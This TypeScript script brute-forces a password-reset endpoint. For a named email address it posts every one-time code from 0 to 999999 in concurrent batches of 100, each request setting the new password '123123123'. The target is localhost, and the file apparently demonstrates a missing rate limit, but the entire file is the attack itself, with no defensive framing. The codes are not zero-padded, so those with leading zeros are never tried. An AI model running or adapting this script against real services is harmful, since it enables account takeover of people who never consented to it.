import axios from "axios";

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "omsureja@gmail.com",
        "otp": otp,
        "newPassword": "123123123"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
    try {
        await axios.request(config)
        console.log("done for " + otp);
    } catch (e) {
        console.error(`Error for OTP ${otp}:`);
    }
}

async function main() {
    for (let i = 0; i <= 999999; i+=100) {
        const promises = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest((i + j).toString()));
        }
        //this is called batching which means that execute all the promises in group of 100 , like first 100 then second 100 and so on
        await Promise.all(promises);
    }
}

main();
